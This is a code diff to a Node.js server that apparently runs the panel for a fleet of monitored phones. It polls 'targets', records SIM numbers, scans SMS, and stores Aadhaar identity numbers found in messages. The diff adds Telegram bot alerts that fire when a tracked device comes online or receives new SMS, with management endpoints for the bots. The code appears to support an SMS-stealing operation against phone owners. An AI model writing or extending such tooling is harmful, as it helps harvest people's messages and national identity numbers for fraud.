@@ -781,6 +781,7 @@ async function pollTarget(target) {
                 || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
       }
 
+      const oldRecord = getTargetDb(target)[actualDid] || null;
       upsertDevice(target, actualDid, {
         brand, last_battery: bat, sim1_number: s1, sim2_number: s2,
         current_status: isOn ? 'online' : 'offline',
@@ -789,6 +790,8 @@ async function pollTarget(target) {
         app_id: appId, obj_id: objId, user_serial: userSerial,
         sim1_enriched: [], sim2_enriched: [],
       });
+      const newRecord = getTargetDb(target)[actualDid];
+      dispatchAlerts(target, actualDid, oldRecord, newRecord);
 
       // Persist aadhaar numbers found in SMS
       if (foundAadhars.length > 0) {
@@ -1340,12 +1343,230 @@ app.post('/api/keywords', express.json(), (req, res) => {
   res.json({ ok: true, count: clean.length });
 });
 
+// ── Telegram Alert Store ──────────────────────────────────────────────────────
+const ALERTS_FILE = path.join(DATA_DIR, 'telegram_alerts.json');
+
+const VALID_URL_SETS = new Set(['new', 'old', 'pp']);
+const VALID_TRIGGERS  = new Set(['device_online', 'device_offline', 'new_sms']);
+const MAX_BOT_NAME   = 100;
+const MAX_BOT_TOKEN  = 200;
+
+let alertStore = { bots: {}, alerts: { new: {}, old: {}, pp: {} } };
+
+function loadAlertStore() {
+  try {
+    if (fs.existsSync(ALERTS_FILE)) {
+      const raw    = fs.readFileSync(ALERTS_FILE, 'utf8');
+      const parsed = JSON.parse(raw);
+      if (parsed && typeof parsed.bots === 'object' && typeof parsed.alerts === 'object') {
+        parsed.alerts.new = parsed.alerts.new || {};
+        parsed.alerts.old = parsed.alerts.old || {};
+        parsed.alerts.pp  = parsed.alerts.pp  || {};
+        alertStore = parsed;
+      } else {
+        console.error(`[AlertStore] ${ALERTS_FILE}: invalid top-level structure, starting empty`);
+      }
+    }
+  } catch (err) {
+    console.error(`[AlertStore] Failed to load ${ALERTS_FILE}: ${err.message}, starting empty`);
+  }
+}
+
+function saveAlertStore() {
+  try {
+    fs.writeFileSync(ALERTS_FILE, JSON.stringify(alertStore, null, 2), 'utf8');
+    return true;
+  } catch (err) {
+    console.error(`[AlertStore] Failed to save ${ALERTS_FILE}: ${err.message}`);
+    return false;
+  }
+}
+
+function targetUrlSet(target) {
+  if (target.isPP)  return 'pp';
+  if (target.isOld) return 'old';
+  return 'new';
+}
+
+async function sendTelegramAlert(token, chatId, text) {
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
+      signal: AbortSignal.timeout(10000),
+    });
+    if (!res.ok) {
+      const body = await res.text().catch(() => '');
+      console.warn(`[TelegramAlert] API returned ${res.status} for chat ${chatId}: ${body}`);
+    }
+  } catch (err) {
+    console.warn(`[TelegramAlert] Failed to send to chat ${chatId}: ${err.message}`);
+  }
+}
+
+function dispatchAlerts(target, deviceId, oldRecord, newRecord) {
+  const urlSet = targetUrlSet(target);
+  const config = alertStore.alerts[urlSet]?.[deviceId];
+  if (!config) return;
+
+  const bot = alertStore.bots[config.bot_id];
+  if (!bot) {
+    console.warn(`[AlertDispatch] Device ${deviceId} (${urlSet}): bot_id "${config.bot_id}" not found`);
+    return;
+  }
+  if (!config.chat_id) {
+    console.warn(`[AlertDispatch] Device ${deviceId} (${urlSet}): chat_id is empty`);
+    return;
+  }
+
+  const now       = new Date().toISOString();
+  const oldStatus = oldRecord?.current_status ?? null;
+  const newStatus = newRecord?.current_status ?? null;
+
+  // Status change alerts
+  if (oldStatus !== newStatus) {
+    if (newStatus === 'online' && config.triggers.includes('device_online')) {
+      const text =
+        `🔔 [${bot.name}]\n` +
+        `Device: ${deviceId}\n` +
+        `URL Set: ${urlSet} (ID ${target.id})\n` +
+        `Status: ${oldStatus ?? 'unknown'} → online\n` +
+        `Time: ${now}`;
+      sendTelegramAlert(bot.token, config.chat_id, text);
+    }
+    if (newStatus === 'offline' && config.triggers.includes('device_offline')) {
+      const text =
+        `🔔 [${bot.name}]\n` +
+        `Device: ${deviceId}\n` +
+        `URL Set: ${urlSet} (ID ${target.id})\n` +
+        `Status: ${oldStatus ?? 'unknown'} → offline\n` +
+        `Time: ${now}`;
+      sendTelegramAlert(bot.token, config.chat_id, text);
+    }
+  }
+
+  // New SMS alert — suppressed on first poll (oldRecord === null)
+  if (
+    config.triggers.includes('new_sms') &&
+    oldRecord !== null &&
+    oldRecord.last_activity !== null &&
+    newRecord.last_activity !== null &&
+    newRecord.last_activity !== oldRecord.last_activity
+  ) {
+    const text =
+      `📩 [${bot.name}]\n` +
+      `Device: ${deviceId}\n` +
+      `URL Set: ${urlSet} (ID ${target.id})\n` +
+      `New SMS activity detected\n` +
+      `Last Activity: ${newRecord.last_activity}\n` +
+      `SIM1: ${newRecord.sim1_number ?? 'N/A'}`;
+    sendTelegramAlert(bot.token, config.chat_id, text);
+  }
+}
+
+// ── Telegram Bot Management API ───────────────────────────────────────────────
+
+app.post('/api/telegram/bots', express.json(), (req, res) => {
+  const { name, token } = req.body || {};
+  if (!name || typeof name !== 'string' || !name.trim())
+    return res.status(400).json({ error: 'name is required and must be non-empty' });
+  if (name.trim().length > MAX_BOT_NAME)
+    return res.status(400).json({ error: `name exceeds ${MAX_BOT_NAME} characters` });
+  if (!token || typeof token !== 'string' || !token.trim())
+    return res.status(400).json({ error: 'token is required and must be non-empty' });
+  if (token.trim().length > MAX_BOT_TOKEN)
+    return res.status(400).json({ error: `token exceeds ${MAX_BOT_TOKEN} characters` });
+  const duplicate = Object.entries(alertStore.bots).find(([, b]) => b.token === token.trim());
+  if (duplicate) return res.status(409).json({ error: 'A bot with this token already exists' });
+  const id = crypto.randomUUID();
+  alertStore.bots[id] = { name: name.trim(), token: token.trim() };
+  if (!saveAlertStore()) return res.status(500).json({ error: 'Failed to persist alert store' });
+  res.status(201).json({ id, name: alertStore.bots[id].name });
+});
+
+app.get('/api/telegram/bots', (req, res) => {
+  const list = Object.entries(alertStore.bots).map(([id, b]) => ({ id, name: b.name }));
+  res.json(list);
+});
+
+app.patch('/api/telegram/bots/:id', express.json(), (req, res) => {
+  const bot = alertStore.bots[req.params.id];
+  if (!bot) return res.status(404).json({ error: 'Bot not found' });
+  const { name } = req.body || {};
+  if (!name || typeof name !== 'string' || !name.trim())
+    return res.status(400).json({ error: 'name is required and must be non-empty' });
+  if (name.trim().length > MAX_BOT_NAME)
+    return res.status(400).json({ error: `name exceeds ${MAX_BOT_NAME} characters` });
+  bot.name = name.trim();
+  if (!saveAlertStore()) return res.status(500).json({ error: 'Failed to persist alert store' });
+  res.json({ id: req.params.id, name: bot.name });
+});
+
+app.delete('/api/telegram/bots/:id', (req, res) => {
+  if (!alertStore.bots[req.params.id]) return res.status(404).json({ error: 'Bot not found' });
+  delete alertStore.bots[req.params.id];
+  for (const urlSet of VALID_URL_SETS) {
+    for (const [devId, cfg] of Object.entries(alertStore.alerts[urlSet] || {})) {
+      if (cfg.bot_id === req.params.id) delete alertStore.alerts[urlSet][devId];
+    }
+  }
+  if (!saveAlertStore()) return res.status(500).json({ error: 'Failed to persist alert store' });
+  res.status(204).end();
+});
+
+// ── Telegram Alert Configuration API ─────────────────────────────────────────
+
+function validateUrlSet(req, res, next) {
+  if (!VALID_URL_SETS.has(req.params.urlSet)) {
+    return res.status(400).json({ error: `Invalid urlSet "${req.params.urlSet}". Must be one of: new, old, pp` });
+  }
+  next();
+}
+
+app.put('/api/telegram/alerts/:urlSet/:deviceId', express.json(), validateUrlSet, (req, res) => {
+  const { bot_id, chat_id, triggers } = req.body || {};
+  if (!bot_id || !chat_id || !triggers)
+    return res.status(400).json({ error: 'bot_id, chat_id, and triggers are required' });
+  if (!alertStore.bots[bot_id])
+    return res.status(400).json({ error: `bot_id "${bot_id}" does not exist` });
+  if (!Array.isArray(triggers) || triggers.length === 0)
+    return res.status(400).json({ error: 'triggers must be a non-empty array' });
+  const invalid = triggers.filter(t => !VALID_TRIGGERS.has(t));
+  if (invalid.length)
+    return res.status(400).json({ error: `Invalid trigger values: ${invalid.join(', ')}` });
+  const cfg = { bot_id, chat_id: String(chat_id), triggers };
+  alertStore.alerts[req.params.urlSet][req.params.deviceId] = cfg;
+  if (!saveAlertStore()) return res.status(500).json({ error: 'Failed to persist alert store' });
+  res.json(cfg);
+});
+
+app.get('/api/telegram/alerts/:urlSet/:deviceId', validateUrlSet, (req, res) => {
+  const cfg = alertStore.alerts[req.params.urlSet]?.[req.params.deviceId];
+  if (!cfg) return res.status(404).json({ error: 'Alert config not found' });
+  res.json(cfg);
+});
+
+app.delete('/api/telegram/alerts/:urlSet/:deviceId', validateUrlSet, (req, res) => {
+  const section = alertStore.alerts[req.params.urlSet];
+  if (!section?.[req.params.deviceId]) return res.status(404).json({ error: 'Alert config not found' });
+  delete section[req.params.deviceId];
+  if (!saveAlertStore()) return res.status(500).json({ error: 'Failed to persist alert store' });
+  res.status(204).end();
+});
+
+app.get('/api/telegram/alerts/:urlSet', validateUrlSet, (req, res) => {
+  res.json(alertStore.alerts[req.params.urlSet] || {});
+});
+
 // ── Serve frontend ────────────────────────────────────────────────────────────
 app.use(express.static(path.join(__dirname, 'public')));
 app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
 // ── Boot ──────────────────────────────────────────────────────────────────────
 loadDashboardDb();
+loadAlertStore();
 // Load custom keywords if saved, otherwise use built-in defaults
 const savedKws = (() => {
   try { if (fs.existsSync(KEYWORDS_FILE)) return JSON.parse(fs.readFileSync(KEYWORDS_FILE, 'utf8')); } catch {}
